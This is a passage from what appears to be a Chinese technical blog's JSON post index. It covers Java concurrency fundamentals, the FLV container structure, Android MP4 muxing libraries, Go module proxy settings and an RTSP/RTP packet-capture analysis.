Exception &#123; return \"Hello,i am running!\"; &#125; public static void main(String[] args) &#123; //创建异步任务 FutureTask&lt;String&gt; task=new FutureTask&lt;String&gt;(new CallerTask()); //启动线程 new Thread(task).start(); try &#123; //等待执行完成，并获取返回结果 String result=task.get(); System.out.println(result); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 3、常用方法3.1、线程等待与通知在Object类中有一些函数可以用于线程的等待与通知。 wait()：当一个线程调用一个共享变量的 wait()方法时， 该调用线程会被阻塞挂起， 到发生下面几件事情之一才返回 ：（1） 线程调用了该共享对象 notify()或者 notifyAll()方法；（2）其他线程调用了该线程 interrupt() 方法，该线程抛出InterruptedException异常返回。 wait(long timeout) ：该方法相 wait() 方法多了一个超时参数，它的不同之处在于，如果一个线程调用共享对象的该方法挂起后，没有在指定的 timeout ms时间内被其它线程调用该共享变量的notify()或者 notifyAll() 方法唤醒，那么该函数还是会因为超时而返回。 wait(long timeout, int nanos)，其内部调用的是 wait(long timout）函数。 上面是线程等待的方法，而唤醒线程主要是下面两个方法： notify() : 一个线程调用共享对象的 notify() 方法后，会唤醒一个在该共享变量上调用 wait 系列方法后被挂起的线程。 一个共享变量上可能会有多个线程在等待，具体唤醒哪个等待的线程是随机的。 notifyAll() ：不同于在共享变量上调用 notify() 函数会唤醒被阻塞到该共享变量上的一个线程，notifyAll()方法则会唤醒所有在该共享变量上由于调用 wait 系列方法而被挂起的线程。 如果有这样的场景，需要等待某几件事情完成后才能继续往下执行，比如多个线程加载资源，需要等待多个线程全部加载完毕再汇总处理。Thread类中有一个join方法可实现。 3.2、线程休眠Thread类中有一个静态态的 sleep 方法，当一个个执行中的线程调用了Thread 的sleep方法后，调用线程会暂时让出指定时间的执行权，也就是在这期间不参与 CPU 的调度，但是该线程所拥有的监视器资源，比如锁还是持有不让出的。指定的睡眠时间到了后该函数会正常返回，线程就处于就绪状态，然后参与 CPU 的调度，获取到 CPU 资源后就可以继续运行。 3.3、让出优先权Thread 有一个静态 yield 方法，当一个线程调用 yield 方法时，实际就是在暗示线程调度器当前线程请求让出自己的CPU 使用，但是线程调度器可以无条件忽略这个暗示。 当一个线程调用 yield 方法时， 当前线程会让出 CPU 使用权，然后处于就绪状态，线程调度器会从线程就绪队列里面获取一个线程优先级最高的线程，当然也有可能会调度到刚刚让出 CPU 的那个线程来获取 CPU 行权。 3.4、线程中断Java 中的线程中断是一种线程间的协作模式，通过设置线程的中断标志并不能直接终止该线程的执行，而是被中断的线程根据中断状态自行处理。 void interrupt() ：中断线程，例如，当线程A运行时，线程B可以调用钱程interrupt() 方法来设置线程的中断标志为 true 并立即返回。设置标志仅仅是设置标志, 线程A实际并没有被中断， 会继续往下执行。如果线程A因为调用了wait() 系列函数、 join 方法或者 sleep 方法阻塞挂起，这时候若线程 B调用线程A的interrupt()方法，线程A会在调用这些方法的地方抛出InterruptedException异常而返回。 boolean isInterrupted() 方法： 检测当前线程是否被中断。 boolean interrupted() 方法： 检测当前线程是否被中断，与 isInterrupted 不同的是，该方法如果发现当前线程被中断，则会清除中断标志。 4、线程状态上面整理了线程的创建方式和一些常用方法，可以用线程的生命周期把这些方法串联起来。 在Java中，线程共有六种状态： 状态 说明 NEW 初始状态：线程被创建，但还没有调用start()方法 RUNNABLE 运行状态：Java线程将操作系统中的就绪和运行两种状态笼统的称作“运行” BLOCKED 阻塞状态：表示线程阻塞于锁 WAITING 等待状态：表示线程进入等待状态，进入该状态表示当前线程需要等待其他线程做出一些特定动作（通知或中断） TIME_WAITING 超时等待状态：该状态不同于 WAITIND，它是可以在指定的时间自行返回的 TERMINATED 终止状态：表示当前线程已经执行完毕 线程在自身的生命周期中， 并不是固定地处于某个状态，而是随着代码的执行在不同的状态之间进行切换，Java线程状态变化如图示： 5、线程上下文切换使用多线程的目的是为了充分利用CPU，但要认识到，每个CPU同一时刻只能被一个线程使用。 为了让用户感觉多个线程是在同时执行的， CPU 资源的分配采用了时间片轮转也就是给每个线程分配一个时间片，线程在时间片内占用 CPU 执行任务。当线程使用完时间片后，就会处于就绪状态并让出 CPU 让其他线程占用，这就是上下文切换。 6、线程死锁死锁是指两个或两个以上的线程在执行过程中，因争夺资源而造成的互相等待的现象，在无外力作用的情况下，这些线程会一直相互等待而无法继续运行下去。 那么为什么会产生死锁呢？ 死锁的产生必须具备以下四个条件： 互斥条件：指线程对己经获取到的资源进行它性使用，即该资源同时只由一个线程占用。如果此时还有其它线程请求获取获取该资源，则请求者只能等待，直至占有资源的线程释放该资源。 请求并持有条件：指一个 线程己经持有了至少一个资源，但又提出了新的资源请求，而新资源己被其它线程占有，所以当前线程会被阻塞，但阻塞 的同时并不释放自己已经获取的资源。 不可剥夺条件：指线程获取到的资源在自己使用完之前不能被其它线程抢占，只有在自己使用完毕后才由自己释放该资源。 环路等待条件：指在发生死锁时，必然存在一个线程——资源的环形链，即线程集合 {T0，T1，T2,…… ，Tn} 中 T0 正在等待一 T1 占用的资源，Tl1正在等待 T2用的资源，…… Tn 在等待己被 T0占用的资源。 该如何避免死锁呢？答案是至少破坏死锁发生的一个条件。 其中，互斥这个条件我们没有办法破坏，因为用锁为的就是互斥。不过其他三个条件都是有办法破坏掉的，到底如何做呢？ 对于“请求并持有”这个条件，可以一次性请求所有的资源。 对于“不可剥夺”这个条件，占用部分资源的线程进一步申请其他资源时，如果申请不到，可以主动释放它占有的资源，这样不可抢占这个条件就破坏掉了。 对于“环路等待”这个条件，可以靠按序申请资源来预防。所谓按序申请，是指资源是有线性顺序的，申请的时候可以先申请资源序号小的，再申请资源序号大的，这样线性化后就不存在环路了。 7、线程分类Java中的线程分为两类，分别为 daemon 线程（守护线程）和 user 线程（用户线程）。 在JVM 启动时会调用 main 函数，main函数所在的钱程就是一个用户线程。其实在 JVM 内部同时还启动了很多守护线程， 比如垃圾回收线程。 那么守护线程和用户线程有什么区别呢？区别之一是当最后一个非守护线程束时， JVM会正常退出，而不管当前是否存在守护线程，也就是说守护线程是否结束并不影响 JVM退出。换而言之，只要有一个用户线程还没结束，正常情况下JVM就不会退出。 8、ThreadLocalThreadLocal是JDK 包提供的，它提供了线程本地变量，也就是如果你创建了ThreadLocal ，那么访问这个变量的每个线程都会有这个变量的一个本地副本，当多个线程操作这个变量时，实际操作的是自己本地内存里面的变量，从而避免了线程安全问题。创建 ThreadLocal 变量后，每个线程都会复制 到自己的本地内存。 可以通过set(T)方法来设置一个值，在当前线程下再通过get()方法获取到原先设置的值。 下面来看一个ThreadLocal的使用实例： 123456789101112131415161718192021222324252627282930313233343536373839public class ThreadLocalTest &#123; //创建ThreadLocal变量 static ThreadLocal&lt;String&gt; localVar = new ThreadLocal&lt;String&gt;(); //打印函数 static void print(String str) &#123; //打印当前线程本地内存中localVar变量值 System.out.println(str + \":\" + localVar.get()); //清除前线程本地内存中localVar变量值 //localVar.remove(); &#125; public static void main(String[] args) &#123; Thread thread1 = new Thread(new Runnable() &#123; public void run() &#123; //设置线程1中本地变量localVal的值 localVar.set(\"线程1的值\"); //调用打印函数 print(\"线程1\"); //打印本地变量的值 System.out.println(\"线程1打印本地变量后：\" + localVar.get()); &#125; &#125;); Thread thread2 = new Thread(new Runnable() &#123; public void run() &#123; //设置线程2中本地变量localVal的值 localVar.set(\"线程2的值\"); //调用打印函数 print(\"线程2\"); //打印本地变量的值 System.out.println(\"线程2打印本地变量后：\" + localVar.get()); &#125; &#125;); thread1.start(); thread2.start(); &#125;&#125; 9、Java内存模型在Java中，所有实例域、静态域和数组元素都存储在堆内存中，堆内存在线程之间共享 。 Java线程之间的通信由Java内存模型控制，Java内存模型决定一个线程对共享变量的写入何时对另一个线程可见。 从抽象的角度来看，Java内存模型定义了线程和主内存之间的抽象关系：线程之间的共享变量存储在主内存（Main Memory）中，每个线程都有一个私有的本地内存（Local Memory），本地内存中存储了该线程以读/写共享变量的副本。本地内存是Java内存模型的 一个抽象概念，并不真实存在。它涵盖了缓存、写缓冲区、寄存器以及其他的硬件和编译器优化。 Java内存模型的抽象示意如图： 在实际实现中线程的工作内存如下图： 10、synchronizedsynchronized 块是 Java 提供的一种原子性内置锁， Java中的每个对象都可以把它当作同步锁来使用，这些 Java内置的使用者看不到的锁被称为内部锁，也作监视器锁。 线程的执行代码在进入 synchronized 代码块前会自动获取内部锁，这时候其他线程访问该同步代码块 被阻塞挂起。拿到内部锁的线程会在正常退出同步代码块或者抛出异常后或者在同步块调用了该内置锁资源 wait系列方法时释放该内置锁。内置锁是排它锁，就是当一个线程获取这个锁后，其他线程必须等待该线程释放锁后才能获取该锁。 synchronized 的内存语义：这个内存语义就可以解决共享变量内存可见性问题，进入synchronized 块的内存语义是把在synchronized 块内使用到的变量从线程的工作内存中清除，这样在 synchronized 块内使用到该变量时就不会从线程的工作内存中获取，而是直接从主内存中获取。 退出 synchronized 块的内存语义是把在 synchronized 块内对共享变修改刷新到主内存。 11、volatile上面介绍了使用锁的方式可以解决共享内存可见性问题，但是使用锁太笨重，因为它会带来线程上下文的切换开销，对于解决内存可见性问题， Java 还提供了volatile种弱形式的同步，也就是使用 volatile 关键字， 该关键字可以确保对一个变量的更新对其他线程马上可见。 当一个变量被声明为volatile时，线程在写入变量时不会把值缓存在寄存器或者其他地方，而是会把值刷新回主内存，当其它线程读取该共享变量，会从主内存重新获取最新值，而不是使用当前线程的工作内存中的值。 volatile虽然提供了可见性保证，但并不保证操作的原子性。 12、Java 中的原子性操作所谓原子性操作，是指执行一系列操作时，这些操作要么全部执行，要么全部不执行，不存在只执行其中一部分的情况。 例如在设计计数器一般都先读取当前值，然后＋1，再更新。这个过程是读-改-写的过程，如果不能保证这个过程是原子性的，那么就会出现线程安问题。 那么如何才能保证多个操作的原子性呢？最简单的方法就是使用 synchronized 关键字进行同步。还可以用CAS操作。从Java 1.5开始，JDK的并发包里也提供了一些类来支持原子操作。 synchronized 是独占锁，没有获取内部锁的线程会被阻塞掉，大大降级了并发性。 13、Java 中的 CAS 操作在Java中， 锁在并发处理中占据了一席之地，但是使用锁有有个不好的地方，就是当线程没有获取到锁时会被阻塞挂起，这会导致线程上下文的切换和重新调度开销。 Java 提供了非阻塞的 volatile 关键字来解决共享变量的可见性问题，这在一定程度上弥补了锁带来的开销问题，但是 volatile 只能保 共享变量可见性，不能解决读-改-写等的原子性问题。 CAS即 Compre and Swap ，其是 JDK 提供的非阻塞原子性操作，它通过硬件保证了比较-更新操作的原子性。JDK 里面的 Unsafe 类提供了一系列的compareAndSwap ＊方法，以 compareAndSwapLong 方法为例，看一下什么是CAS操作。 boolean compareAndSwapLong(Object obj,long valueOffset,long expect, long update ）: CAS 有四个操作数，分别为对象内存位置、 对象中 变量的偏移量、变量预期值和新的值 。其操作含义是：只有当对象 obj 中内存偏移量为 valueOffset 的变量预期值为 expect 的时候，才会将ecpect更新为update。 这是处理器提供的一个原子性指令。 CAS有个经典的ABA问题。因为CAS需要在操作值的时候，检查值有没有发生变化，如果没有发生变化，则更新，但是如果一个值原来是A，变成了B，又变成了A，那么使用CAS进行检查时会发现它 的值没有发生变化，但是实际上却变化了。ABA问题的解决思路就是使用版本号。在变量前面追加上版本号，每次变量更新的时候把版本号加1，那么A→B→A就会变成1A→2B→3A。 14、锁的概述14.1、乐观锁与悲观锁乐观锁和悲观锁是在数据库中引入的名词，但是在并发包锁里面引入了类似的思想。 悲观锁指对数据被外界修改持保守态度，认为数据很容易就会被其他线程修改，所以在数据被处理前先对数据进行加锁，并在整个数据处理过程中，使数据处于锁定状态。悲观锁的实现往往依靠数据库提供的锁机制，即在数据 ，在对数据记录操作前给记录排它锁。如果获取锁失败， 则说明数据正在被其它线程修改，当前线程则等待或者抛出异常。 如果获取锁成功，则对记录进行操作 ，然后提交事务后释放排它锁。 乐观锁相对悲观锁来说的，它认为数据在一般情况下不会造成冲突，所以在访问记录前不会加排它锁，而在进行数据提交更新时，才会正式对数据冲 与否进行检测 。具体来说，根据 update 返回的行数让用户决定如何去做 。 14.2、公平锁与非公平锁根据线程获取锁的抢占机制，锁可以分为公平锁和非公平锁，公平锁表示线程获取锁的顺序是按照线程请求锁的时间早晚来决定的，也就是最早请求锁的线程将最早获取到锁。 而非公平锁是在运行时闯入，也就是先来不一定先得。 ReentrantLock 提供了公平锁和非公平锁的实现： 公平锁： ReentrantLock pairLock =new eentrantLock(true) 非公平锁： ReentrantLock pairLock =new ReentrantLock(false) 。 构造函数不传数，则默认是非公平锁。 例如，假设线程A已经持有了锁，这时候线程B请求该锁其将被挂起 。当线程A释放锁后，假如当前有线程C也需要取该锁，如果采用非公平锁式，则根据线程调度策略 ，线程B和线程C两者之一可能获取锁，这时候不需要任何其他干涉，而如果使用公平锁则需要把C挂起，让B获取当前锁。 在没有公平性需求的前提下尽量使用非公平锁，因为公平锁会带来性能开销。 14.3、独占锁与共享锁根据锁只能被单个线程持有还是能被多个线程共同持有，锁可以分为独占锁和共享锁。 独占锁保证任何时候都只有一个线程能得到锁， ReentrantLock 就是以独占方式实现的。 共享锁则可以同时由多个线程持有 ，例如 ReadWriteLock读写锁，它允许一个资源可以被多线程同时进行读操作。 独占锁是一种悲观锁，共享锁是一种乐观锁。 14.4、可重入锁当一个线程要获取一个被其他线程持有的独占锁时，该线程会被阻塞。 那么当 一个线程再次获取它自己己经获取的锁时是否会被阻塞呢？如果不被阻塞，那么我们说该锁是可重入的，也就是只要该线程获取了该锁，那么可以无限次数（严格来说是有限次数）地进入被该锁锁住的代码。 14.5、自旋锁由于 Java 中的线程是与操作系统中的线程 一一对应的，所以当一个线程在获取锁（比如独占锁）失败后，会被切换到内核状态而被挂起 。当该线程获取到锁时又需要将其切换到内核状态而唤醒该线程。而从用户状态切换到内核状态的开销是比较大的，在一定程度上会影响并发性能。 自旋锁则是，当前线程在获取锁时，如果发现锁已经被其他线程占有，它不马上阻塞自己，在不放弃 CPU 使用权的情况下，多次尝试获取（默认次数是 10 ，可以使用 -XX:PreBlockSpinsh 参数设置该值），很有可能在后面几次尝试中其他线程己经释放了锁，如果尝试指定的次数后仍没有获取到锁则当前线程才会被阻塞挂起。由此看来自旋锁是使用 CPU 时间换取线程阻塞与调度的开销，但是很有可能这些 CPU 时间白白浪费了。 参考： 【1】：瞿陆续，薛宾田 编著 《并发编程之美》 【2】：极客时间 《Java并发编程实践》 【3】：方腾飞等编著《Java并发编程的艺术》","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"FLV封装格式解析","slug":"音视频/FLV封装格式解析","date":"2020-07-28T09:53:36.000Z","updated":"2021-12-28T03:24:10.313Z","comments":true,"path":"音视频/FLV封装格式解析/","link":"","permalink":"http://yoursite.com/音视频/FLV封装格式解析/","excerpt":"","text":"版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。本文链接：https://blog.csdn.net/houxiaoni01/article/details/78832414 FLV（Flash Video）是Adobe公司设计开发的一种流行的流媒体格式，由于其视频文件体积轻巧、封装简单等特点，使其很适合在互联网上进行应用。此外，FLV可以使用Flash Player进行播放，而Flash Player插件已经安装在全世界绝大部分浏览器上，这使得通过网页播放FLV视频十分容易。目前主流的视频网站如优酷网，土豆网，乐视网等网站无一例外地使用了FLV格式。FLV封装格式的文件后缀通常为“.flv”。 总体上看，FLV包括文件头（File Header）和文件体（File Body）两部分，其中文件体由一系列的Tag组成。因此一个FLV文件是如图1-1结构。 头文件 Tag#1 Tag#2 Tag#3 … 图1-1 文件结构（简图） 其中，每个Tag前面还包含了Previous Tag Size字段，表示前面一个Tag的大小。Tag的类型可以是视频、音频和Script，每个Tag只能包含以上三种类型的数据中的一种。图1-2展示了FLV文件的详细结构。 下面详细介绍一下三种Tag的Tag Data部分的结构。 (a) Audio Tag Data结构（音频Tag） 音频Tag开始的第1个字节包含了音频数据的参数信息，从第2个字节开始为音频流数据。结构如图1-3所示。 第1个字节的前4位的数值表示了音频编码类型。如表1-1所示。 表1-1.音频编码类型 值 含义 0 Linear PCM，platform endian 1 ADPCM 2 MP3 3 Linear PCM，little endian 4 Nellymoser 16-kHz mono 5 Nellymoser 8-kHz mono 6 Nellymoser 7 G.711 A-law logarithmic PCM 8 G.711 mu-law logarithmic PCM 9 reserved 10 AAC 14 MP3 8-Khz 15 Device-specific sound 第1个字节的第5-6位的数值表示音频采样率。如表1-2所示。 表1-2.音频采样率 值 含义 0 5.5kHz 1 11KHz 2 22 kHz 3 44 kHz PS：从上表可以发现，FLV封装格式并不支持48KHz的采样率。 第1个字节的第7位表示音频采样精度。如表1-3所示。 表1-3.音频采样精度 值 含义 0 8bits 1 16bits 第1个字节的第8位表示音频类型。 表1-4. 音频类型 值 含义 0 sndMono 1 sndStereo (b) Video Tag Data结构（视频Tag） 视频Tag也用开始的第1个字节包含视频数据的参数信息，从第2个字节为视频流数据。结构如图1-4所示。 第1个字节的前4位的数值表示帧类型。如表1-5所示。 表1-5.帧类型 值 含义 1 keyframe （for AVC，a seekable frame） 2 inter frame （for AVC，a nonseekable frame） 3 disposable inter frame （H.263 only） 4 generated keyframe （reserved for server use） 5 video info/command frame 第1个字节的后4位的数值表示视频编码类型。如表1-6所示。 表1-6.视频编码类型 值 含义 1 JPEG （currently unused） 2 Sorenson H.263 3 Screen video 4 On2 VP6 5 On2 VP6 with alpha channel 6 Screen video version 2 7 AVC (c) Script Tag Data结构（控制帧） 该类型Tag又通常被称为Metadata Tag，会放一些关于FLV视频和音频的元数据信息如：duration、width、height等。通常该类型Tag会跟在File Header后面作为第一个Tag出现，而且只有一个。结构如图1-5所示。 AMF1（“onMetaData”） AMF2（“width,height…”） 图1-5.Script Tag Data结构 第一个AMF包： 第1个字节表示AMF包类型，一般总是0x02，表示字符串。第2-3个字节为UI16类型值，标识字符串的长度，一般总是0x000A（“onMetaData”长度）。后面字节为具体的字符串，一般总为“onMetaData”（6F,6E,4D,65,74,61,44,61,74,61）。 第二个AMF包： 第1个字节表示AMF包类型，一般总是0x08，表示数组。第2-5个字节为UI32类型值，表示数组元素的个数。后面即为各数组元素的封装，数组元素为元素名称和值组成的对。常见的数组元素如表1-7所示。 表1-7.常见MetaData 值 含义 duration 时长 width 视频宽度 height 视频高度 videodatarate 视频码率 framerate 视频帧率 videocodecid 视频编码方式 audiosamplerate 音频采样率 audiosamplesize 音频采样精度 stereo 是否为立体声 audiocodecid 音频编码方式 filesize 文件大小","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[{"name":"flv","slug":"flv","permalink":"http://yoursite.com/tags/flv/"}]},{"title":"Android 操作Mp4文件库","slug":"音视频/Android 操作Mp4文件库","date":"2020-07-28T09:52:36.000Z","updated":"2021-12-28T03:24:10.312Z","comments":true,"path":"音视频/Android 操作Mp4文件库/","link":"","permalink":"http://yoursite.com/音视频/Android 操作Mp4文件库/","excerpt":"","text":"1. 文件操作【mp4parser】 这个库提供了用于读取、写入和创建MP4文件的Java API，包含三个组件： isoparser muxer streaming 我用了muxer，将H264文件和AAC文件合并为MP4文件。 123456&lt;!-- https://mvnrepository.com/artifact/org.mp4parser/muxer --&gt;&lt;dependency&gt; &lt;groupId&gt;org.mp4parser&lt;/groupId&gt; &lt;artifactId&gt;muxer&lt;/artifactId&gt; &lt;version&gt;1.9.41&lt;/version&gt;&lt;/dependency&gt; 12345678910H264TrackImpl h264Track = new H264TrackImpl(new FileDataSourceImpl(h264Path));AACTrackImpl aacTrack = new AACTrackImpl(new FileDataSourceImpl(aacPath));Movie movie = new Movie();movie.addTrack(h264Track);movie.addTrack(aacTrack);Container mp4file = new DefaultMp4Builder().build(movie);FileChannel fc = new FileOutputStream(new File(outPath)).getChannel();mp4file.writeContainer(fc);fc.close(); 2. 流式合并 【MediaMuxer】 Android 4.3 提供的一套用于将视频（H.264、H.263）和音频（AAC、ARM-NB、ARM-WB）合成的为mp4格式的一套简单好用的API C++开源库 【mp4v2】 ，网上多数人用的是【2.0.0版本】 mp4v2为操作mp4文件提供了一套强大的API。mp4v2提供了一套基于ISO/IEC 14496-1:2001标准的mp4格式文件的创建和修改的API，这个媒体容器被广泛的使用，具有很好的兼容性。 不过对于我们Android开发来说有点麻烦，还需要自己做NDK编译和二次封装。","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[{"name":"mp4,mp4parser","slug":"mp4-mp4parser","permalink":"http://yoursite.com/tags/mp4-mp4parser/"}]},{"title":"Golang设置代理解决包依赖问题","slug":"Golang/Golang设置代理解决包依赖问题","date":"2020-07-21T11:58:28.000Z","updated":"2020-07-21T11:58:28.000Z","comments":true,"path":"Golang/Golang设置代理解决包依赖问题/","link":"","permalink":"http://yoursite.com/Golang/Golang设置代理解决包依赖问题/","excerpt":"","text":"go get下载包失败在国内是常见的问题，下面是通过设置代理的解决方案 Go 版本是 1.13 及以上 （推荐）12$ go env -w GO111MODULE=on$ go env -w GOPROXY=https://goproxy.io,direct Go 版本是 1.12 及以下(实测1.14用这个方法也可以)12345678910111213$ vim /etc/profile （全部用户生效）# 或者$ vim ~/.profile （当前用户生效）export GO111MODULE=on# 七牛云赞助支持的export GOPROXY=https://goproxy.cn# 阿里云#export GOPROXY=https://mirrors.aliyun.com/goproxy/# goproxy.io#export GOPROXY=https://goproxy.io/$ source ~/.profile","categories":[{"name":"Golang","slug":"Golang","permalink":"http://yoursite.com/categories/Golang/"}],"tags":[]},{"title":"RTSP网络抓包分析","slug":"音视频/RTSP抓包分析","date":"2020-07-16T11:52:36.000Z","updated":"2021-12-28T03:24:10.316Z","comments":true,"path":"音视频/RTSP抓包分析/","link":"","permalink":"http://yoursite.com/音视频/RTSP抓包分析/","excerpt":"","text":"抓包文件在附件中… 一、Play 抓包 Over TCP 推流Client端rtmp-rtsp-stream-client-java server端EasyDarwin 播放Client端 Javacv 录制（ 这里用Wireshark抓包 ） tcp追踪流12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970OPTIONS rtsp://192.168.0.223:554/test/ RTSP/1.0CSeq: 1User-Agent: Lavf58.12.100RTSP/1.0 200 OKCSeq: 1Session: PoC0zKnGRPublic: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORDDESCRIBE rtsp://192.168.0.223:554/test/ RTSP/1.0Accept: application/sdpCSeq: 2User-Agent: Lavf58.12.100Session: PoC0zKnGRRTSP/1.0 200 OKCSeq: 2Session: PoC0zKnGRContent-Length: 444v=0o=- 0 0 IN IP4 127.0.0.1s=Unnamedi=N/Ac=IN IP4 192.168.0.223t=0 0a=recvonlym=video 0 RTP/AVP 96a=rtpmap:96 H264/90000a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;a=control:trackID=1m=audio 0 RTP/AVP 96a=rtpmap:96 MPEG4-GENERIC/32000/2a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1290; SizeLength=13; IndexLength=3; IndexDeltaLength=3;a=control:trackID=0SETUP rtsp://192.168.0.223:554/test/trackID=1 RTSP/1.0Transport: RTP/AVP/TCP;unicast;interleaved=0-1CSeq: 3User-Agent: Lavf58.12.100Session: PoC0zKnGRRTSP/1.0 200 OKCSeq: 3Session: PoC0zKnGRTransport: RTP/AVP/TCP;unicast;interleaved=0-1SETUP rtsp://192.168.0.223:554/test/trackID=0 RTSP/1.0Transport: RTP/AVP/TCP;unicast;interleaved=2-3CSeq: 4User-Agent: Lavf58.12.100Session: PoC0zKnGRRTSP/1.0 200 OKCSeq: 4Session: PoC0zKnGRTransport: RTP/AVP/TCP;unicast;interleaved=2-3PLAY rtsp://192.168.0.223:554/test/ RTSP/1.0Range: npt=0.000-CSeq: 5User-Agent: Lavf58.12.100Session: PoC0zKnGRRTSP/1.0 200 OKCSeq: 5Session: PoC0zKnGRRange: npt=0.000-#这是紧接着一帧一帧rtp包（rtp over tcp）701ce71cfb29c8ff28ed6843080045000524c1c240004006f1c3c0a800dfc0a8001e022ae383d37e23f074458e0a501800feecab0000240004f88060447500bd14102e9f0a407c85b803f06fe00f0e157e880381bc15565f8c35982ddba36a0312c81fd3800a814eb570c928a7818974f2303f010e39d505ae59ae3ebb42bbe706078d36e0997a0e00020011c000fff70000fea1d04f4480006968249f20dad1f9b600a5b19018a3c169c190e22c754f401f5cb5f3a4fa0736d00d6cbcb19670584cc24d248c1c51ef552de01e01807565e81e0ce8185fc160dbbeea53228011496146e44add661440a93ca0b20a0e6b2455413b9964320ed088f5cb751a24effc030f6b65c1d423a60fcf96247b9e7de03c0ef60020a1d76ad07eab06ad7584bfea63cfc9f5af1516029898299d30daa09cbff265002a099de41d7fa2262cc9a2957e885747b2bfd24b95583fd2007b1dc8060c63d0f9cb6000201a7968ad6b1eb03fc4932ee1efbc13b7a1ef52167acab89f939b0d039dad33c4b541c6ee759e541591f309071a007c130ffd1801818830226664c4db87bc2a00342111c8a630a654263ac5856721e37ed483ab31f8fa7a6797d9135039ffdfffa121bf11d0f440a84cbf443d5c9edd00010114f1c8298d5ad50b189ec1da94250a4826c50f3620d9da18cdffffb8ea614710240104fe5fa6886924bcc0d76987aa095427a80a08e13f0b935ca244c4ed4ff43b4ce7cd881a403cf8932bbffff695047712c3e0b19448ad5405308200306a59632f0a50e9a7a488da16040ece88915077f4299c947fff0794c028eba019c1036e548ce347af0cc3b1a18448fbaca4a4adaa8efd7b06f5be2dc1e7daec2ca97e2070654438fc5fe8dd06e0d30400f6fa7e09acc0c889df44c0a9cfda3c70f1cd3e0c9adcb6e208141e03bdfafd780400a3a3bf0f72fab2f7df9f8d0c701ff82c2105b6e2bcd85ea95fba2f79bbfd03539e2b4c412951d0bd4bf0581855cbcff519f54bd70d41c3b0a2f9bbe5fcf8aae3e87146bbe3c793a202ec6a5f5524a38c7fa7b6df5e90476add0f23a1539f71a2bdb6928320a0a01bdeb58527002d97c3826fcfdf7a6dc9e9a79909d71489e700531cc90d2f252aa97a97e9c1431a76fa785f03b42e60ee9f97fa6dedd63450c29b6f4d34fe3eb5c6b1d556ec510f6b6e6c8e31fede9a7ddfa939b8a9ad15b07e1e911cf2b358b776ee90de750f21b78eb8ad4ecc9c9859576c89856d2238b2feb87ca0a07f5f98bd655755bf2f6e66cb13c5b9cda6b50d605ddc4921c7a69f6fcf80aac42aaac56d5c98d6ec6b9f1e90d3183e9fc46623829bfef4b37de2d6d6d170c862ada69edb71f7723a98e6ad4bd289f42dfcb9cd90dd43cfdbd530a4e028320cdc846dd36e9ff6db77ffb8be74a93c98cce6c37ee9ca9ff1abd7d33b92dddd4d8ffaf2e0b703c21c342837a3460a8fe2002dae062608045068ace00a404e19d8d080527c354e368ce82406ab26eb61b0018c3b9991b036c07153560b53840bd0398c01e01e1c129b5b2e0efc55e32bae349338fa42a8a8c31427df5c18abc6f2f36aae5b55c78a648a6b4e3fdacd931184ea59d1e64cda61c0c0b2fb65e3ab07d70ff4b8988488acf3b25d56fa3039c123b28eff95e380c8dee9530e128920d476f47b28867b80fbb4e96af68a781b7e8bb9663c0130f8f752c7c9bbea0090e3e99b7797ff124528fc31a950e5fc651b85bdedf5ea5daa5ca41e2c2e7940ecb8e58448133afe9acaa6fb63badd2930240346a6eeda99aabb44822a41351c75d0725e36ad4d1fdc1086dbb9e6a5ee416d2df2ee372317b9541c6612d94cbb61357b2be0e37f981772c3880e02e2f4cc47e866 240004f88060447500bd14102e9f0a40 这一段 rtp over tcp 的头信息 240004f8 是 RTSP Interleaved Frame （RTSP交错帧头） rtp over tcp 发送时要加这四个字节： 第一个字节Magic是 ‘$’ 符号； 第二个字节channel在rtsp的setup时获取； 第三、四个字节是rtp包的大小，第三个字节高4位，第四个字节保存低8位，最大12位。 123Magic: 0x24Channel: 0x00Length: 1272 8060447500bd14102e9f0a40 是 RTP 头 12345678910.. .... = Version: RFC 1889 Version (2)..0. .... = Padding: False...0 .... = Extension: False.... 0000 = Contributing source identifiers count: 00... .... = Marker: FalsePayload type: DynamicRTP-Type-96 (96)Sequence number: 17525Timestamp: 12391440Synchronization Source identifier: 0x2e9f0a40 (782174784) 80-60-4475-00bd1410-2e9f0a40 五组数据一个一个分析 12345678910111213140 1 2 37 6 5 4 3 2 1 0 |7 6 5 4 3 2 1 0|7 6 5 4 3 2 1 0| 7 6 5 4 3 2 1 0+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|V=2|P|X| CC |M| PT | sequence number |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| timestamp |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| synchronization source (SSRC) identifier |+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+| contributing source (CSRC) identifiers || .... |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+Figure 1. RTP header according to RFC 3550 版本号(V)：2Bit，用来标志使用RTP版本 填充位：1Bit，如果该位置位，则该RTP包的尾部就包含填充的附加字节 扩展位(X)：1Bit，如果该位置位，则该RTP包的固定头部后面就跟着一个扩展头部 CSRC技术器(CC)：4Bit，含有固定头部后面跟着的CSRC的数据 标记位(M)：1Bit，该位的解释由配置文档来承担 载荷类型(PT)：7Bit，标识了RTP载荷的类型 